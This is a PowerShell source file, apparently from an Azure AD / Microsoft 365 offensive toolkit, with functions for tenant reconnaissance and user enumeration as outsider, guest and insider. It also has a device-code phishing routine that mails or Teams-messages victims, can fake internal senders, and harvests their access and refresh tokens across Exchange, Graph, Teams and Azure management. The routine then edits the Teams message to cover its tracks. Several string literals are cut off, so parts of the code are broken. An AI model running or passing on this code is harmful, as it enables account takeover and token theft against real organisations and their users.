
function Invoke-ReconAsOutsider
{
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName="domain",Mandatory=$True)]
        [String]$DomainName,
        [Parameter(ParameterSetName="user",Mandatory=$True)]
        [String]$UserName,
        [Switch]$Single,
        [Switch]$GetRelayingParties
    )
    Process
    {
        if([string]::IsNullOrEmpty($DomainName))
        {
            $DomainName = $UserName.Split("@")[1]

            Write-Verbose "Checking CBA status."
            $tenantCBA = HasCBA -UserName $UserName
        }
        Write-Verbose "Checking if the domain $DomainName is registered to Azure AD"
        $tenantId =     Get-TenantID -Domain $DomainName
        if([string]::IsNullOrEmpty($tenantId))
        {
            throw "Domain $DomainName is not registered to Azure AD"
        }

        $openIDConfiguration = Get-OpenIDConfiguration -Domain $DomainName

        $tenantName =   ""
        $tenantBrand =  ""
        $tenantRegion = $openIDConfiguration.tenant_region_scope
        $tenantSubscope = Get-TenantSubscope -OpenIDConfiguration $openIDConfiguration
        $tenantSSO =    ""
        
        Write-Verbose "`n*`n* EXAMINING TENANT $tenantId`n*"

        
        Write-Verbose "Getting domains.."
        $domains = Get-TenantDomains -Domain $DomainName -SubScope $tenantSubscope
        Write-Verbose "Found $($domains.count) domains!"
        
        $domainInformation = @()
        
        $c=1

        foreach($domain in $domains)
        {
            $exists =         $false
            $hasCloudMX =     $false
            $hasCloudSPF =    $false
			$hasCloudDKIM =   $false
			$hasCloudMTASTS = $false

            if(-not $Single)
            {
                Write-Progress -Activity "Getting DNS information" -Status $domain -PercentComplete (($c/$domains.count)*100)
            }
            $c++

            if([string]::IsNullOrEmpty($tenantName) -and $domain.ToLower() -match '^[^.]*\.onmicrosoft.((com)|(us))$')
            {
                $tenantName = $domain
                Write-Verbose "TENANT NAME: $tenantName"
            }

            if([string]::IsNullOrEmpty($tenantSSO))
            {
                $tenantSSO = HasDesktopSSO -Domain $domain -SubScope $tenantSubscope
            }

            if(-not $Single -or ($Single -and $DomainName -eq $domain))
            {

                try { $exists = (Resolve-DnsName -Name $Domain -ErrorAction SilentlyContinue -DnsOnly -NoHostsFile -NoIdn).count -gt 0 }  catch{}

                if($exists)
                {
                 
                    $hasCloudMX = HasCloudMX -Domain $domain -SubScope $tenantSubscope

                 
                    $hasCloudSPF = HasCloudSPF -Domain $domain -SubScope $tenantSubscope

                 
                    $hasDMARC = HasDMARC -Domain $domain
					
				
					$hasCloudDKIM = HasCloudDKIM -Domain $domain -SubScope $tenantSubscope
					
				
					$hasCloudMTASTS = HasCloudMTASTS -Domain $domain -SubScope $tenantSubscope
                }

                
                $realmInfo = Get-UserRealmV2 -UserName "nn@$domain" -SubScope $tenantSubscope
                if([string]::IsNullOrEmpty($tenantBrand))
                {
                    $tenantBrand = $realmInfo.FederationBrandName
                    Write-Verbose "TENANT BRAND: $tenantBrand"
                }
                if($authUrl = $realmInfo.AuthUrl)
                {
                
                    if($GetRelayingParties)
                    {
                        try
                        {
                        
                            $idpUrl = $realmInfo.AuthUrl.Substring(0,$realmInfo.AuthUrl.LastIndexOf("/")+1)
                            $idpUrl += "idpinitiatedsignon.aspx"
                            Write-Verbose "Getting relaying parties for $domain from $idpUrl"
                            [xml]$page = Invoke-RestMethod -Uri $idpUrl -TimeoutSec 3

                            $selectElement = $page.html.body.div.div[2].div.div.div.form.div[1].div[1].select.option
                            $relayingParties = New-Object string[] $selectElement.Count
                            Write-Verbose "Got $relayingParties relaying parties from $idpUrl"
                            for($o = 0; $o -lt $selectElement.Count; $o++)
                            {
                                $relayingParties[$o] = $selectElement[$o].'                            }
                    
                        }
                        catch{}
                    }

                    $authUrl = $authUrl.split("/")[2]
                }

                $attributes=[ordered]@{
                    "Name" =    $domain
                    "DNS" =     $exists
                    "MX" =      $hasCloudMX
                    "SPF" =     $hasCloudSPF
                    "DMARC" =   $hasDMARC
					"DKIM" =    $hasCloudDKIM						 
					"MTA-STS" = $hasCloudMTASTS						   
                    "Type" =    $realmInfo.NameSpaceType
                    "STS" =     $authUrl 
                }
                if($GetRelayingParties)
                {
                    $attributes["RPS"] =   $relayingParties 
                }
                Remove-Variable "relayingParties" -ErrorAction SilentlyContinue
                $domainInformation += New-Object psobject -Property $attributes
            }
        }

        Write-Host "Tenant brand:       $tenantBrand"
        Write-Host "Tenant name:        $tenantName"
        Write-Host "Tenant id:          $tenantId"
        Write-Host "Tenant region:      $tenantRegion"
        if(![string]::IsNullOrEmpty($tenantSubscope))
        {
            Write-Host "Tenant sub region:  $tenantSubscope"
        }
        
        if(!$Single -or $tenantSSO -eq $true)
        {
            Write-Host "DesktopSSO enabled: $tenantSSO"
        }

        if(![string]::IsNullOrEmpty($tenantName))
        {
            $tenantMDI = GetMDIInstance -Tenant $tenantName
            if($tenantMDI)
            {
                Write-Host "MDI instance:       $tenantMDI"
            }
        }

        
        if(DoesUserExists -User "ADToAADSyncServiceAccount@$($tenantName)")
        {
            Write-Host "Uses cloud sync:    $true"
        }

        
        if($tenantCBA)
        {
            Write-Host "CBA enabled:        $tenantCBA"
        }
        
        return $domainInformation
    }

}


function Invoke-UserEnumerationAsOutsider
{
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName="Normal",  Mandatory=$True,ValueFromPipeline)]
        [Parameter(ParameterSetName="External",Mandatory=$True,ValueFromPipeline)]
        [String[]]$UserName,
        [Parameter(ParameterSetName="External", Mandatory=$True)]
        [Switch]$External,
        [Parameter(ParameterSetName="External",Mandatory=$True)]
        [String]$Domain,
        [Parameter(Mandatory=$False)]
        [ValidateSet("Normal","Login","Autologon","RST2")]
        [String]$Method="Normal"
    )
    Process
    {
        foreach($User in $UserName)
        {
            $tenantSubscope = Get-TenantSubscope -Domain $UserName.Split("@")[1]

            if($Method -eq "Normal" -and $External)
            {
                $User="$($User.Replace("@","_"))            }

            new-object psobject -Property ([ordered]@{"UserName"=$User;"Exists" = $(DoesUserExists -User $User -Method $Method -SubScope $tenantSubscope)})
        }
    }
}

function Invoke-ReconAsGuest
{

    [cmdletbinding()]
    Param()
    Begin
    {
     
        $choises="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!""    }
    Process
    {
     
        $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"

     
        $tenants = Get-AzureTenants -AccessToken $AccessToken
        $tenantNames = $tenants | Select-Object -ExpandProperty Name

     
        if($tenantNames.count -gt 1)
        {
            $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
            for($p=0; $p -lt $tenantNames.count; $p++)
            {
                $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
            }
            $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to recon",$options,0)
            }
        else
        {
            $opt=0
        }
        $tenantInfo = $tenants[$opt]
        $tenant =     $tenantInfo.Id

        $tenantInformation = Get-AzureInformation -Tenant $tenant


        if(!$tenantInformation.authorizationPolicy)
        {
            $tenantInformation.guestAccess = "unknown"
        }


        Write-Host "Tenant brand:                $($tenantInformation.displayName)"
        Write-Host "Tenant name:                 $($tenantInformation.domains | Where-Object isInitial -eq "True" | Select-Object -ExpandProperty id)"
        Write-Host "Tenant id:                   $($tenantInformation.objectId)"
        Write-Host "Azure AD objects:            $($tenantInformation.directorySizeQuota.used)/$($tenantInformation.directorySizeQuota.total)"
        Write-Host "Domains:                     $($tenantInformation.domains.Count) ($(($tenantInformation.domains | Where-Object isVerified -eq "True").Count) verified)"
        Write-Host "Non-admin users restricted?  $($tenantInformation.restrictNonAdminUsers)"
        Write-Host "Users can register apps?     $($tenantInformation.usersCanRegisterApps)"
        Write-Host "Directory access restricted? $($tenantInformation.restrictDirectoryAccess)"
        Write-Host "Guest access:                $($tenantInformation.guestAccess)"
        Write-Host "CA policies:                 $($tenantInformation.conditionalAccessPolicy.Count)" 
        Write-Host "Access package admins:       $($tenantInformation.accessPackageAdmins.Count)" 
        
        return $tenantInformation

    }
}

function Invoke-UserEnumerationAsGuest
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]$UserName,
        [Switch]$Groups,
        [Switch]$GroupMembers,
        [Switch]$Subordinates,
        [Switch]$Manager,
        [Switch]$Roles,
        [Parameter(Mandatory=$False)]
        [String]$GroupId
    )
    Begin
    {
        $choises="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!""    }
    Process
    {
        $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"

        Write-Verbose "Getting list of user's tenants.."
        $tenants = Get-AzureTenants -AccessToken $AccessToken
        $tenantNames = $tenants | Select-Object -ExpandProperty Name


        if($tenantNames.count -gt 1)
        {
            $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
            for($p=0; $p -lt $tenantNames.count; $p++)
            {
                $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
            }
            $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to recon",$options,0)
            }
        else
        {
            $opt=0
        }
        $tenantInfo = $tenants[$opt]
        $tenant =     $tenantInfo.Id


        $refresh_token = Get-RefreshTokenFromCache -ClientID "d3590ed6-52b3-4102-aeff-aad2292ab01c" -Resource "https://management.core.windows.net"
        if([string]::IsNullOrEmpty($refresh_token))
        {
            throw "No refresh token found! Use Get-AADIntAccessTokenForAzureCoreManagement with -SaveToCache switch"
        }
        try
        {
            $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://graph.microsoft.com" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -TenantId $tenant -RefreshToken $refresh_token -SaveToCache $true
        }
        catch
        {
            Throw "Unable to get access token for Microsoft Graph API"
        }


        $domains = Get-MSGraphDomains -AccessToken $AccessToken
        $tenantDomain = $domains | Where-Object isInitial -eq "True" | Select-Object -ExpandProperty id
        if([string]::IsNullOrEmpty($tenantDomain))
        {
            Throw "No initial domain found for the tenant $tenant!"
        }
        Write-Verbose "Tenant $Tenant / $tenantDomain selected."

        


        if($GroupId)
        {

            $ht_users=@{}


            $members = Get-MSGraphGroupMembers -AccessToken $AccessToken -GroupId $GroupId


            $itemMembers = @()


            foreach($member in $members)
            {
                $ht_users[$member.Id] = $member
                $itemMembers += $member.userPrincipalName
            }
        }
        else
        {

            
            if([string]::IsNullOrEmpty($UserName))
            {
                $UserName = (Read-Accesstoken -AccessToken $AccessToken).upn

            
                if([string]::IsNullOrEmpty($UserName))
                {
                    $UserName = (Read-Accesstoken -AccessToken $AccessToken).email
                }

                if(-not ($UserName -like "*                {
                    $UserName = "$($UserName.Replace("@","_"))                }
            }

            Write-Verbose "Getting user information for user $UserName"

            $user = Get-MSGraphUser -UserPrincipalName $UserName -AccessToken $AccessToken 

            if([string]::IsNullOrEmpty($user))
            {
                throw "User $UserName not found!"
            }


            $ht_users=@{
                $user.id = $user
                }


            $ht_groups=@{}


            $ht_roles=@{}

            Write-Verbose "User found: $($user.id) ($($user.userPrincipalName))"

                        if($Subordinates)
            {
                                $so_keys = New-Object string[] $ht_users.Count
                $ht_users.Keys.CopyTo($so_keys,0)

                                foreach($userId in $so_keys)
                {
                    $user = $ht_users[$userId].userPrincipalName
                    Write-Verbose "Getting subordinates of $user"

                                        $userSubordinates = Get-MSGraphUserDirectReports -AccessToken $AccessToken -UserPrincipalName $user

                                        foreach($subordinate in $userSubordinates)
                    {
                        $ht_users[$subordinate.Id] = $subordinate
                    }
                }
            }

                        if($Manager)
            {
                try{$userManager= Get-MSGraphUserManager -AccessToken $AccessToken -UserPrincipalName $UserName}catch{}
                if($userManager)
                {
                    $ht_users[$userManager.id] = $userManager
                }
            }

                        if($Groups -or $GroupMembers)
            {
                foreach($userId in $ht_users.Keys)
                {
                    $groupUser = $ht_users[$userId].userPrincipalName
                    Write-Verbose "Getting groups of $groupUser"

                                        $userGroups = Get-MSGraphUserMemberOf -AccessToken $AccessToken -UserPrincipalName $groupUser

                                        foreach($group in $userGroups)
                    {
                                                if($group.'@odata.type' -eq "                        {
                            $ht_groups[$group.id] = $group
                                                    }
                    }

                }
            }

                        if($GroupMembers)
            {
                foreach($groupId in $ht_groups.Keys)
                {
                    Write-Verbose "Getting groups of $groupUser"

                                        $members = Get-MSGraphGroupMembers -AccessToken $AccessToken -GroupId $groupId

                                        $itemMembers = @()

                                        foreach($member in $members)
                    {
                        $ht_users[$member.Id] = $member
                        $itemMembers += $member.userPrincipalName
                    }

                                        $ht_groups[$groupId] | Add-Member -NotePropertyName "members" -NotePropertyValue $itemMembers

                                        $owners = Get-MSGraphGroupOwners -AccessToken $AccessToken -GroupId $groupId

                                        $itemOwners = @()

                                        foreach($owner in $owners)
                    {
                        $ht_users[$owner.Id] = $owner
                        $itemOwners += $owner.userPrincipalName
                    }

                                        $ht_groups[$groupId] | Add-Member -NotePropertyName "owners" -NotePropertyValue $itemOwners
                }
            }

                        if($Roles)
            {
                foreach($userId in $ht_users.Keys)
                {
                    $roleUser = $ht_users[$userId].userPrincipalName
                    Write-Verbose "Getting roles of $roleUser"

                                        $userRoles = Get-MSGraphUserMemberOf -AccessToken $AccessToken -UserPrincipalName $roleUser

                                        foreach($userRole in $userRoles)
                    {
                        if($userRole.'@odata.type' -eq "                        {
                                                        $role = $ht_roles[$userRole.id]
                            if($role)
                            {
                                                                $role.members+=$ht_users[$userId].userPrincipalName
                            }
                            else
                            {
                                                                $userRole | Add-Member -NotePropertyName "members" -NotePropertyValue @($ht_users[$userId].userPrincipalName)
                                $role = $userRole
                            }

                            $ht_roles[$role.id] = $role
                        }
                    }

                }
            }

                        if($Roles)
            {
                foreach($roleId in $ht_roles.Keys)
                {
                    $members = $null
                    Write-Verbose "Getting role members for '$($ht_roles[$roleId].displayName)'"

                                        try{$members = Get-MSGraphRoleMembers -AccessToken $AccessToken -RoleId $roleId}catch{ }

                    if($members)
                    {
                                                $itemMembers = @()

                                                foreach($member in $members)
                        {
                            $ht_users[$member.Id] = $member
                            $itemMembers += $member.userPrincipalName
                        }

                                                $ht_roles[$roleId] | Add-Member -NotePropertyName "members" -NotePropertyValue $itemMembers -Force
                    }
                }
            }
        }

                Write-Host "Tenant brand: $($tenantInfo.Name)"
        Write-Host "Tenant name:  $tenantDomain"
        Write-Host "Tenant id:    $($tenantInfo.id)"
        Write-Host "Logged in as: $((Read-Accesstoken -AccessToken $AccessToken).unique_name)"
        Write-Host "Users:        $($ht_users.count)"
        Write-Host "Groups:       $($ht_groups.count)"
        Write-Host "Roles:        $($ht_roles.count)"

                $attributes=@{
            "Users" =  $ht_users.values
            "Groups" = $ht_groups.Values
            "Roles" =  $ht_roles.Values
        }
        return New-Object psobject -Property $attributes
    }
}


function Invoke-ReconAsInsider
{
    [cmdletbinding()]
    Param()
    Begin
    {
        
    }
    Process
    {
                $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        
                $tenantId = (Read-Accesstoken $AccessToken).tid
        $refresh_token = Get-RefreshTokenFromCache -AccessToken $AccessToken
        
        $AAD_AccessToken       = Get-AccessTokenWithRefreshToken -RefreshToken $refresh_token -Resource "https://graph.windows.net" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -TenantId $tenantId
        $MSPartner_AccessToken = Get-AccessTokenWithRefreshToken -RefreshToken $refresh_token -Resource "fa3d9a0c-3fb0-42cc-9193-47c7ecd2edbd" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -TenantId $tenantId
        $AdminAPI_AccessToken  = Get-AccessTokenWithRefreshToken -RefreshToken $refresh_token -Resource "https://admin.microsoft.com" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -TenantId $tenantId

                Write-Verbose "Getting company information"
        $companyInformation = Get-CompanyInformation -AccessToken $AAD_AccessToken

                Write-Verbose "Getting SharePoint Online information"
        $sharePointInformation = Get-SPOServiceInformation -AccessToken $AAD_AccessToken

                Write-Verbose "Getting role information"
        $roles = Get-Roles -AccessToken $AAD_AccessToken
        $roleInformation=@()
        $sortedRoles = $roles.Role | Sort-Object -Property Name
        foreach($role in $roles.Role)
        {
            Write-Verbose "Getting members of role ""$($role.Name)"""
            $attributes=[ordered]@{}
            $attributes["Name"] = $role.Name
            $attributes["IsEnabled"] = $role.IsEnabled
            $attributes["IsSystem"] = $role.IsSystem
            $attributes["ObjectId"] = $role.ObjectId
            $members = Get-RoleMembers -AccessToken $AAD_AccessToken -RoleObjectId $role.ObjectId | Select-Object @{N='DisplayName'; E={$_.DisplayName}},@{N='UserPrincipalName'; E={$_.EmailAddress}}

            $attributes["Members"] = $members

            $roleInformation += New-Object psobject -Property $attributes
        }

                Write-Verbose "Getting tenant information"
        $tenantInformation = Get-AzureInformation -Tenant $tenantId

                Write-Verbose "Getting basic partner information"
        $partnerInformation = Get-PartnerInformation -AccessToken $AAD_AccessToken

                Write-Verbose "Getting partner organisation information"
        $partnerOrganisations = @(Get-MSPartnerOrganizations -AccessToken $MSPartner_AccessToken)

                Write-Verbose "Getting partner role information"
        $partnerRoleInformation = @(Get-MSPartnerRoleMembers -AccessToken $MSPartner_AccessToken)

                Write-Verbose "Getting partner contracts (customers)"
        try
        {
            $partnerContracts = @(Get-MSPartnerContracts -AccessToken $AAD_AccessToken)
        }
        catch
        {
                    }

                Write-Verbose "Getting partners"
        try
        {
            $partners = @(Get-MSPartners -AccessToken $AdminAPI_AccessToken)
        }
        catch
        {
                    }

                $tenantSku = @()
        if($tenantInformation.skuInfo.aadPremiumBasic)
        {
            $tenantSku += "Premium Basic"
        }
        if($tenantInformation.skuInfo.aadPremium)
        {
            $tenantSku += "Premium P1"
        }
        if($tenantInformation.skuInfo.aadPremiumP2)
        {
            $tenantSku += "Premium P2"
        }
        if($tenantInformation.skuInfo.aadBasic)
        {
            $tenantSku += "Basic"
        }
        if($tenantInformation.skuInfo.aadBasicEdu)
        {
            $tenantSku += "Basic Edu"
        }
        if($tenantInformation.skuInfo.aadSmb)
        {
            $tenantSku += "SMB"
        }
        if($tenantInformation.skuInfo.enterprisePackE3)
        {
            $tenantSku += "E3"
        }
        if($tenantInformation.skuInfo.enterprisePremiumE5)
        {
            $tenantSku += "Premium E5"
        }
        

                $tenantInformation |Add-Member -NotePropertyName "companyInformation"     -NotePropertyValue $companyInformation
        $tenantInformation |Add-Member -NotePropertyName "SPOInformation"         -NotePropertyValue $sharePointInformation
        $tenantInformation |Add-Member -NotePropertyName "roleInformation"        -NotePropertyValue $roleInformation
        $tenantInformation |Add-Member -NotePropertyName "partnerDAPEnabled"      -NotePropertyValue ($partnerInformation.DapEnabled -eq "true")
        $tenantInformation |Add-Member -NotePropertyName "partnerType"            -NotePropertyValue $partnerInformation.CompanyType
        $tenantInformation |Add-Member -NotePropertyName "partnerContracts"       -NotePropertyValue $partnerContracts
        $tenantInformation |Add-Member -NotePropertyName "partnerOrganisations"   -NotePropertyValue $partnerOrganisations
        $tenantInformation |Add-Member -NotePropertyName "partners"               -NotePropertyValue $partners
        $tenantInformation |Add-Member -NotePropertyName "partnerRoleInformation" -NotePropertyValue $partnerRoleInformation

                Write-Host "Tenant brand:                $($tenantInformation.displayName)"
        Write-Host "Tenant name:                 $($tenantInformation.domains | Where-Object isInitial -eq "True" | Select-Object -ExpandProperty id)"
        Write-Host "Tenant id:                   $tenantId"
        Write-Host "Tenant SKU:                  $($tenantSku -join ", ")"
        Write-Host "Azure AD objects:            $($tenantInformation.directorySizeQuota.used)/$($tenantInformation.directorySizeQuota.total)"
        Write-Host "Domains:                     $($tenantInformation.domains.Count) ($(($tenantInformation.domains | Where-Object isVerified -eq "True").Count) verified)"
        Write-Host "Non-admin users restricted?  $($tenantInformation.restrictNonAdminUsers)"
        Write-Host "Users can register apps?     $($tenantInformation.usersCanRegisterApps)"
        Write-Host "Directory access restricted? $($tenantInformation.restrictDirectoryAccess)"
        Write-Host "Directory sync enabled?      $($tenantInformation.companyInformation.DirectorySynchronizationEnabled)"
        Write-Host "Global admins:               $(@($tenantInformation.roleInformation | Where-Object ObjectId -eq "62e90394-69f5-4237-9190-012177145e10" | Select-Object -ExpandProperty Members).Count)" 
        Write-Host "CA policies:                 $($tenantInformation.conditionalAccessPolicy.Count)" 
        Write-Host "MS Partner IDs:              $(($tenantInformation.partnerOrganisations | Where-Object typeName -Like "Partner*" ).MPNID -join ",")"             
        Write-Host "MS Partner DAP enabled?      $($tenantInformation.partnerDAPEnabled)"
        Write-Host "MS Partner contracts:        $($tenantInformation.partnerContracts.Count)"             
        Write-Host "MS Partners:                 $($tenantInformation.partners.Count)"
            

                return $tenantInformation

    }
}

function Invoke-UserEnumerationAsInsider
{

    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [int] $MaxResults=1000,
        [switch] $Groups,
        [switch] $GroupMembers,
        [Parameter(Mandatory=$False)]
        [String]$GroupId
    )
    Begin
    {
    }
    Process
    {
                $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"

                 $refresh_token = Get-RefreshTokenFromCache -AccessToken $AccessToken
        if([string]::IsNullOrEmpty($refresh_token))
        {
            throw "No refresh token found! Use Get-AADIntAccessTokenForAzureCoreManagement with -SaveToCache switch"
        }
                $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://graph.microsoft.com" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -TenantId (Read-Accesstoken $AccessToken).tid -RefreshToken $refresh_token -SaveToCache $true

                if([String]::IsNullOrEmpty($GroupId))
        {
            $users = Call-MSGraphAPI -MaxResults $MaxResults -AccessToken $AccessToken -API "users" -ApiVersion "v1.0" -QueryString "`$select=id,displayName,userPrincipalName,userType,onPremisesImmutableId,onPremisesLastSyncDateTime,onPremisesSamAccountName,onPremisesSecurityIdentifier,onPremisesDistinguishedName,refreshTokensValidFromDateTime,signInSessionsValidFromDateTime,proxyAddresses,businessPhones,identities"
        }

                if($Groups -or $GroupMembers -or $GroupId)
        {
            $groupsAPI="groups"
            $groupQS = ""
            if($GroupMembers -or $GroupId)
            {
                $groupQS="`$expand=members"
            }
            if($GroupId)
            {
                $groupsAPI="groups/$GroupId/"
            }
            $groupResults = Call-MSGraphAPI -MaxResults $MaxResults -AccessToken $AccessToken -API $groupsAPI -ApiVersion "v1.0" -QueryString $groupQS
        }
        $attributes=@{
            "Users" =  $users
            "Groups" = $groupResults
        }

                Write-Host "Users:        $($Users.count)"
        Write-Host "Groups:       $(if($GroupId -and $groupResults -ne $null){1}else{$groupResults.count})"

                New-Object psobject -Property $attributes
    }
}

function Invoke-Phishing
{

    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]$Tenant="Common",
        [Parameter(Mandatory=$True)]
        [String[]]$Recipients,
        [Parameter(Mandatory=$False)]
        [String]$Message='<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>',

        [Parameter(ParameterSetName='Teams',Mandatory=$True)]
        [Switch]$Teams,
        [Parameter(ParameterSetName='Teams',Mandatory=$False)]
        [String]$CleanMessage='<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>',
        [Parameter(ParameterSetName='Teams')]
        [switch]$External,
        [Parameter(ParameterSetName='Teams')]
        [switch]$FakeInternal,

        [Parameter(ParameterSetName='Mail',Mandatory=$True)]
        [String]$Subject,
        [Parameter(ParameterSetName='Mail',Mandatory=$True)]
        [String]$Sender,
        [Parameter(ParameterSetName='Mail',Mandatory=$True)]
        [String]$SMTPServer,
        [Parameter(ParameterSetName='Mail',Mandatory=$False)]
        [System.Management.Automation.PSCredential]$SMTPCredentials,

        [Switch]$SaveToCache
        
    )
    Begin
    {
        $choises="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!""    
    }
    Process
    {
        if($Teams)
        {
            $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        }
        if($External)
        {
            $Tenant = Get-AADIntTenantID -UserName $Recipients[0]
        }

        if([string]::IsNullOrEmpty($Tenant))
        {
            $tenants = Get-AzureTenants -AccessToken $AccessToken
            $tenantNames = $tenants | Select-Object -ExpandProperty Name

                            if($tenantNames.count -gt 1)
            {
                $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
                for($p=0; $p -lt $tenantNames.count; $p++)
                {
                    $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
                }
                $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to sent messages to",$options,0)
            }
            else
            {
                $opt=0
            }
            $tenantInfo = $tenants[$opt]
            $tenant =     $tenantInfo.Id
        }

                    $refresh_token = Get-RefreshTokenFromCache -ClientID "d3590ed6-52b3-4102-aeff-aad2292ab01c" -Resource "https://management.core.windows.net"
        if([string]::IsNullOrEmpty($refresh_token))
        {
            throw "No refresh token found! Use Get-AADIntAccessTokenForAzureCoreManagement with -SaveToCache switch"
        }
        $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com" -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -TenantId (Read-AccessToken -AccessToken $AccessToken).tid -RefreshToken $refresh_token -SaveToCache $true
    }

            $clientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    $body=@{
        "client_id" = $clientId
        "resource" =  "https://graph.windows.net"
    }

            $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$tenant/oauth2/devicecode?api-version=1.0" -Body $body

    Write-Host "Code: $($authResponse.user_code)"
    
            $message=[string]::Format($message,$authResponse.user_code,$authResponse.verification_url)
    
            $teamsMessages=@()
    foreach($recipient in $Recipients)
    {
        if($Teams)
        {
            $msgDetails = Send-TeamsMessage -AccessToken $AccessToken -Recipients $recipient -Message $Message -Html -External $External -FakeInternal $FakeInternal
            Write-Host "Teams message sent to: $Recipients. ClientMessageId: $($msgDetails.ClientMessageId)"
            $msgDetails | Add-Member -NotePropertyName "Recipient" -NotePropertyValue $recipient
            $teamsMessages += $msgDetails
        }
        else
        {
            Send-MailMessage -from $Sender -to $recipient -Subject $Subject -Body $message -SmtpServer $SMTPServer -BodyAsHtml -Encoding utf8
            Write-Host "Mail sent to: $recipient"
        }
    }
    

    $continue = $true
    $interval = $authResponse.interval
    $expires =  $authResponse.expires_in

            $body=@{
        "client_id" =  $ClientId
        "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
        "code" =       $authResponse.device_code
        "resource" =   $Resource
    }

            while($continue)
    {
        Start-Sleep -Seconds $interval
        $total += $interval

        if($total -gt $expires)
        {
            Write-Error "Timeout occurred"
            return
        }
                    
                    try
        {
            $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/$Tenant/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
        }
        catch
        {
                            $details=$_.ErrorDetails.Message | ConvertFrom-Json
            $continue = $details.error -eq "authorization_pending"
            Write-Verbose $details.error
            Write-Host "." -NoNewline

            if(!$continue)
            {
                                    Write-Error $details.error_description
                return
            }
        }

        if($response)
        {
            Write-Host ""                 break             
        }
    }

    $user = (Read-Accesstoken -AccessToken $response.access_token).upn
    if([String]::IsNullOrEmpty($user))
    {
        $user = (Read-Accesstoken -AccessToken $response.access_token).unique_name
    }
    Write-Host "Received access token for $user"

    foreach($msg in $teamsMessages)
    {
        Send-TeamsMessage -AccessToken $AccessToken -ClientMessageId $msg.ClientMessageId -Message $CleanMessage -Html | Out-Null
    }

    if($SaveToCache)
    {
        Write-Verbose "ACCESS TOKEN: SAVE TO CACHE"
        Add-AccessTokenToCache -AccessToken $response.access_token -RefreshToken $response.refresh_token -ShowCache $false
    }
    
    $attributes = @{
        "AADGraph" =         $response.access_token
        "refresh_token" =    $response.refresh_token
        "EXO" =              Get-AccessTokenWithRefreshToken -Resource "https://outlook.office365.com"        -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
        "OWA" =              Get-AccessTokenWithRefreshToken -Resource "https://outlook.office.com"           -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
        "Substrate" =        Get-AccessTokenWithRefreshToken -Resource "https://substrate.office.com"         -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
        "MSGraph" =          Get-AccessTokenWithRefreshToken -Resource "https://graph.microsoft.com"          -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
        "AZCoreManagement" = Get-AccessTokenWithRefreshToken -Resource "https://management.core.windows.net/" -ClientId $clientId                              -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
        "Teams" =            Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com"         -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -RefreshToken $response.refresh_token -TenantId $Tenant -SaveToCache $SaveToCache
    }

    if(!$SaveToCache)
    {
        return New-Object psobject -Property $attributes
    }
    
}
